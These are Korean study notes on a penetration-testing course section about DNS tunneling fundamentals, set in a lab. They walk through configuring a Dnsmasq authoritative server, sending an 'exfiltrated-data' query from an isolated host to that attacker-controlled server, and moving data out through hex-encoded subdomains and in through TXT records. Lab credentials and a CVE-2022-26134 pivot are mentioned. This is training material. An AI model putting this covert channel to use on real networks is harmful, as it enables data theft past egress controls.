# 20.2.1 DNS 터널링 기초

> **DNS Tunneling Fundamentals** · PEN-200 §20.2.1

인터넷 데이터는 이름이 아니라 IP 주소로 라우팅되므로, 도메인 이름으로 접근하려면 먼저 주소를 얻어내야 함(해석, resolve). 보통은 **재귀 리졸버(recursive resolver)** 에 A 레코드(IPv4 주소를 담는 DNS 데이터 타입)를 물음. 실제 일은 리졸버가 다 함 — 요청이 충족될 때까지 이어지는 질의를 대신 던지고 결과만 돌려줌.

`www.example.com` 해석 순서:

1. 리졸버가 보유한 **루트 네임서버** 목록(2022년 기준 전 세계 13개) 중 하나에 질의함
2. `.com` 접미사이므로 루트가 **`.com` TLD 네임서버** 주소를 응답함
3. 리졸버가 TLD 에 `example.com` 담당을 물음 → **`example.com` 권한 네임서버(authoritative name server)** 주소를 응답함
4. 리졸버가 그 권한 네임서버에 `www.example.com` 의 A 레코드를 물어 받아 우리에게 돌려줌

전 구간이 UDP 로 오가고 표준 포트는 UDP/53 임. ISP 가 주는 리졸버(공유기에 박혀 있음)를 쓰는 것이 흔하지만 `8.8.8.8` 같은 공개 리졸버도 씀.

*MULTISERVER03 을 리졸버로 둔 DNS 질의 흐름*

⭐ **DNS 터널링의 인과는 4단계에 다 들어 있음** — 질의가 결국 «그 존의 권한 네임서버» 까지 도달함. 그 권한 네임서버를 공격자가 소유하면, 아웃바운드가 전혀 없는 내부 호스트라도 자기 리졸버에 이름을 묻는 것만으로 공격자 서버에 데이터를 실어 보낼 수 있음. 내부 호스트는 리졸버하고만 말하므로 경계 장비 관점에서는 평범한 DNS 임.

랩 구성 — WAN 에 FELINEAUTHORITY 가 새로 있고 `feline.corp` 존의 권한 네임서버로 등록돼 있음. Kali·MULTISERVER03·CONFLUENCE01 은 여기로 라우팅되지만 PGDATABASE01·HRSHARES 는 못 감. 대신 PGDATABASE01 은 MULTISERVER03 에 붙을 수 있고, **그 MULTISERVER03 이 PGDATABASE01 의 DNS 리졸버**임.

실전이라면 도메인을 직접 등록하고 권한 네임서버를 세운 뒤 등록기관에 그 서버를 존의 권한 NS 로 알려야 함. 랩에서는 이미 구성돼 제공됨.

관찰하려면 셸이 둘 필요함 — PGDATABASE01 은 직접 못 가므로 CVE-2022-26134 로 CONFLUENCE01 을 잡고 SSH 원격 포트 포워딩으로 중계해 `database_admin` 으로 접속함. FELINEAUTHORITY 는 WAN 이라 `kali` / `7he_C4t_c0ntro11er` 로 바로 SSH 함.

FELINEAUTHORITY 를 실제 DNS 서버로 만드는 데는 설정이 거의 필요 없는 **Dnsmasq** 를 씀. 설정 파일들은 `~/dns_tunneling` 에 있음.

```
kali@felineauthority:~$ cd dns_tunneling
kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts
# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```

*기본 Dnsmasq 설정 — feline.corp 의 권한 서버로만 동작*

`/etc/resolv.conf`·`/etc/hosts` 를 무시하고 `auth-zone`·`auth-server` 만 정의함. 레코드를 하나도 안 넣었으므로 `feline.corp` 관련 요청은 전부 실패 응답이 나감.

```
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-
Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```

*설정 파일(`-C`)로 기동, 포그라운드(`-d`)로 띄워 나중에 쉽게 종료*

*PGDATABASE01 에 설정된 DNS 서버 확인*

DNS 서버가 MULTISERVER03(`10.4.50.64`) 으로 잡혀 있고, PGDATABASE01 자체는 아웃바운드가 없어 FELINEAUTHORITY 나 Kali 와 직접 통신하지 못함. 이 상태에서 없는 이름을 하나 물어 봄.

```
database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
Server:     127.0.0.53
Address:    127.0.0.53#53
** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```

*존재하지 않는 하위 도메인 질의 — NXDOMAIN*

NXDOMAIN 은 예상된 결과임(레코드를 안 만들었음). 응답 서버가 `127.0.0.53` 인 것도 정상 — Ubuntu 의 `systemd-resolved` 스텁 리졸버이고, Netplan 이 지정한 서버로 질의를 전달함. 다만 **캐시가 끼므로** 옛 응답이 의심되면 `resolvectl flush-caches` 로 비울 것. `nslookup exfiltrated-data.feline.corp 192.168.50.64` 처럼 서버를 직접 지정할 수도 있음.

정작 볼 것은 FELINEAUTHORITY 쪽 캡처임.

```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

*MULTISERVER03 을 거쳐 FELINEAUTHORITY 에 도착한 질의*

MULTISERVER03 이 `feline.corp` 의 권한 네임서버를 알아냈고, 그 하위 도메인 요청은 전부 FELINEAUTHORITY 로 전달됨. Dnsmasq 는 처리할 레코드가 없어 NXDomain 을 돌려줬을 뿐이지만, **질의 자체는 도착했음.**

*nslookup 이후의 요청 전달 흐름*

그림에서는 루트·TLD 질의 단계가 생략됨 — 실제 망이라면 FELINEAUTHORITY 로 가기 전에 그 단계들이 선행함.

⭐ 결론이 큼 — **아웃바운드 연결이 전혀 없는 내부 호스트가 DNS 질의만으로 외부의 우리 서버에 정보를 넘김.** 이것이 유출(exfiltration) 통로임.

바이너리를 빼내려면 순차 요청으로 확장함 — 파일을 긴 16진 문자열로 바꾸고, 잘게 쪼개, 각 조각을 `[hex-string-chunk].feline.corp` 질의로 보냄. 서버에서는 들어온 질의를 전부 로깅해 16진 문자열을 이어 바이너리로 복원함.

반대 방향(infiltration)은 «응답» 레코드를 씀. 지금까지 쓴 A 레코드는 IPv4 주소만 담지만, **TXT 레코드는 임의 문자열을 담도록 설계된 범용 레코드**라 데이터를 실어 들여보낼 수 있음. 앞의 dnsmasq 를 Ctrl+C 로 끄고 TXT 설정으로 다시 띄움.

```
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts
# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-
Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```

*TXT 레코드를 추가한 설정과 그것으로 기동*

`txt-record=` 줄은 «대상 도메인, 임의 문자열» 을 콤마로 구분해 적음. 같은 도메인에 여러 줄을 두면 문자열이 함께 응답됨.

```
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:     192.168.50.64
Address:    192.168.50.64#53
Non-authoritative answer:
www.feline.corp    text = "here's something useful!"
www.feline.corp text = "here's something else less useful."
Authoritative answers can be found from:
database_admin@pgdatabase01:~$
```

*PGDATABASE01 에서 받은 TXT 응답*

`nslookup -type=txt` 로 설정한 문자열이 그대로 내부까지 들어옴. 바이너리를 넣으려면 Base64 나 ASCII 16진으로 인코딩한 TXT 레코드를 여러 개 서빙하고 내부 호스트에서 복원하면 됨.

정리 — DNS 레코드로 데이터를 내보내는 경로(하위 도메인 이름)와 들여오는 경로(TXT 응답)를 각각 확인함. 다음 절의 dnscat2 가 이 기법으로 다목적 DNS 터널을 만듦.
